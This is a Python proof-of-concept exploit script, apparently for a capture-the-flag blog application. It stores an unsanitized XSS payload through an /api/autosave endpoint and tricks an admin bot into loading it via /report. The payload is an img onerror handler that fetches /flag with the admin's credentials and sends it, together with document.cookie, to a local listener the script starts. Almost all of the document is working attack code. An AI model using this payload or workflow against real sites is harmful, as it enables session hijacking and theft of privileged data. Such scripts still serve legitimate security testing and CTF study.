#!/usr/bin/env python3
"""PoC for stored XSS via /api/autosave + admin bot /report.

This script:
  1) Registers a user (or logs in if already exists)
  2) Creates a new post (via /edit)
  3) Directly calls /api/autosave with UNSANITIZED HTML payload (bypasses DOMPurify)
  4) Starts a local HTTP listener to receive exfiltration
  5) Submits /report to make the admin bot visit /edit/<postId>

When the admin bot loads the editor page, the injected payload runs in admin context and
exfiltrates /flag to our listener.

Usage:
  python3 ProofOfConcept.py --target http://localhost:3000 --lhost 127.0.0.1 --lport 8000

Notes:
  - Assumes the app uses cookie-based session 'sid'.
  - Assumes /report accepts a URL and the bot is able to reach lhost:lport.
  - If the bot runs in a container, use an address it can reach (e.g., host.docker.internal).
"""

import argparse
import http.server
import json
import random
import re
import socketserver
import string
import threading
import time
from urllib.parse import urlparse, parse_qs

import requests


def randstr(n=10):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


class ExfilHandler(http.server.BaseHTTPRequestHandler):
    server_version = "ExfilHTTP/0.1"

    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        if 'f' in qs:
            data = qs['f'][0]
            self.server.exfil_data = data
            print("\n[+] Received exfiltrated data (urlencoded):")
            print(data)
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"ok\n")

    def log_message(self, fmt, *args):
        # quiet
        return


def start_listener(lhost, lport):
    httpd = socketserver.TCPServer((lhost, lport), ExfilHandler)
    httpd.exfil_data = None
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    return httpd


def try_register(sess: requests.Session, base: str, username: str, password: str):
    # Try common endpoints; ignore failures.
    for path in ("/register", "/signup"):
        try:
            r = sess.post(base + path, data={"username": username, "password": password}, allow_redirects=False, timeout=10)
            if r.status_code in (200, 302, 303):
                return True
        except requests.RequestException:
            pass
    return False


def login(sess: requests.Session, base: str, username: str, password: str):
    for path in ("/login",):
        r = sess.post(base + path, data={"username": username, "password": password}, allow_redirects=False, timeout=10)
        if r.status_code in (200, 302, 303):
            return True
    return False


def create_post_and_get_id(sess: requests.Session, base: str):
    # Many CTF blog apps create a new draft on GET /edit and redirect to /edit/:id
    r = sess.get(base + "/edit", allow_redirects=False, timeout=10)
    if r.status_code in (301, 302, 303) and 'Location' in r.headers:
        loc = r.headers['Location']
        m = re.search(r"/edit/(\d+)", loc)
        if m:
            return int(m.group(1))

    # Otherwise, maybe /edit returns HTML containing data-post-id
    if r.status_code == 200:
        m = re.search(r"data-post-id=\"(\d+)\"", r.text)
        if m:
            return int(m.group(1))

    # Fallback: try to find any /edit/<id> in response
    m = re.search(r"/edit/(\d+)", r.text)
    if m:
        return int(m.group(1))

    raise RuntimeError("Could not determine postId from /edit response")


def autosave_xss(sess: requests.Session, base: str, post_id: int, payload_html: str):
    r = sess.post(
        base + "/api/autosave",
        headers={"Content-Type": "application/json"},
        data=json.dumps({"postId": post_id, "content": payload_html}),
        timeout=10,
    )
    if r.status_code != 200:
        raise RuntimeError(f"/api/autosave failed: HTTP {r.status_code} {r.text[:200]}")
    try:
        j = r.json()
    except Exception:
        j = None
    if not (isinstance(j, dict) and j.get('ok') is True):
        print("[!] Unexpected autosave response:", r.text[:200])
    return True


def report_to_admin(sess: requests.Session, base: str, url: str):
    # Try common report formats
    # 1) form-encoded
    for data in ({"url": url}, {"link": url}):
        try:
            r = sess.post(base + "/report", data=data, allow_redirects=False, timeout=10)
            if r.status_code in (200, 302, 303):
                return True
        except requests.RequestException:
            pass

    # 2) JSON
    for data in ({"url": url}, {"link": url}):
        try:
            r = sess.post(base + "/report", json=data, allow_redirects=False, timeout=10)
            if r.status_code in (200, 302, 303):
                return True
        except requests.RequestException:
            pass

    raise RuntimeError("/report submission failed")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://localhost:3000", help="Base URL of target")
    ap.add_argument("--lhost", default="127.0.0.1", help="Listener host (reachable by admin bot)")
    ap.add_argument("--lport", type=int, default=8000, help="Listener port")
    ap.add_argument("--username", default=None)
    ap.add_argument("--password", default=None)
    ap.add_argument("--timeout", type=int, default=60, help="Seconds to wait for exfil")
    args = ap.parse_args()

    base = args.target.rstrip('/')
    username = args.username or ("poc_" + randstr(6))
    password = args.password or ("P@ssw0rd_" + randstr(6))

    print(f"[+] Target: {base}")
    print(f"[+] Using creds: {username}:{password}")

    httpd = start_listener(args.lhost, args.lport)
    exfil_url = f"http://{args.lhost}:{args.lport}/?f="
    print(f"[+] Exfil listener: http://{args.lhost}:{args.lport}/")

    sess = requests.Session()

    # Register (best-effort) then login
    try_register(sess, base, username, password)
    if not login(sess, base, username, password):
        raise SystemExit("[-] Login failed (check endpoints/credentials)")

    sid = sess.cookies.get('sid')
    print(f"[+] Logged in. sid={sid}")

    post_id = create_post_and_get_id(sess, base)
    print(f"[+] Created/obtained postId={post_id}")

    # Payload: use <img onerror> to run JS. Exfiltrate /flag.
    # Also demonstrates cookie theft (sid not HttpOnly) by including document.cookie.
    payload = (
        "<img src=x onerror=\""
        "fetch('/flag',{credentials:'include'})"
        ".then(r=>r.text())"
        ".then(f=>fetch('" + exfil_url + "'+encodeURIComponent('FLAG='+f+'\\nCOOKIE='+document.cookie)))"
        ".catch(e=>fetch('" + exfil_url + "'+encodeURIComponent('ERR='+e)))"
        "\">"
    )

    autosave_xss(sess, base, post_id, payload)
    print("[+] Stored XSS payload via /api/autosave")

    victim_url = f"{base}/edit/{post_id}"
    report_to_admin(sess, base, victim_url)
    print(f"[+] Submitted /report for admin bot to visit: {victim_url}")

    print(f"[+] Waiting up to {args.timeout}s for exfil...")
    t0 = time.time()
    while time.time() - t0 < args.timeout:
        if httpd.exfil_data is not None:
            print("\n[+] SUCCESS: got exfil. Decode URL-encoding to view full content.")
            httpd.shutdown()
            return
        time.sleep(0.25)

    httpd.shutdown()
    print("[-] Timed out waiting for exfil. If running in Docker, set --lhost to a reachable host (e.g., host.docker.internal).")


if __name__ == "__main__":
    main()
